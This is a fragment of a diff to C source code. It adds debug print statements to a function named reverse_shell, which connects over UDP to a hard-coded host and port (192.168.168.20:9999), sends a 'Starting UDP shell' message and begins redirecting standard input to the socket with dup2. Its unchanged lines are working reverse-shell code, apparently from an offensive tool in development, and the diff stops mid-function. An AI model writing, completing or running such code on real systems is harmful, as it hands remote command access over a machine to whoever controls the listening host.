@@ -66,11 +66,13 @@ int reverse_shell(){
 	const char *host = "192.168.168.20";
 	int port = 9999;
 
+	printf("reverse shell: entered function \n");
 	/* Set up sockaddr struct */
 	struct sockaddr_in address;
 	address.sin_family = AF_INET;
 	address.sin_port = htons(port);
 	inet_aton(host, &address.sin_addr);
+	printf("reverse shell: set up sockaddr \n");
 
 	/* Connect */
 	int s = socket(AF_INET, SOCK_DGRAM, 0);
@@ -80,6 +82,8 @@ int reverse_shell(){
 	char buf[20];
 	strcpy(buf, "Starting UDP shell\n");
 	sendto(s, &buf, strlen(buf)+1, 0, (struct sockaddr*)&address, sizeof(address));
+
+	printf("reverse shell: sent first msg to remote \n");
 
 	/* Copy file descriptors */
 	dup2(s, STDIN_FILENO);
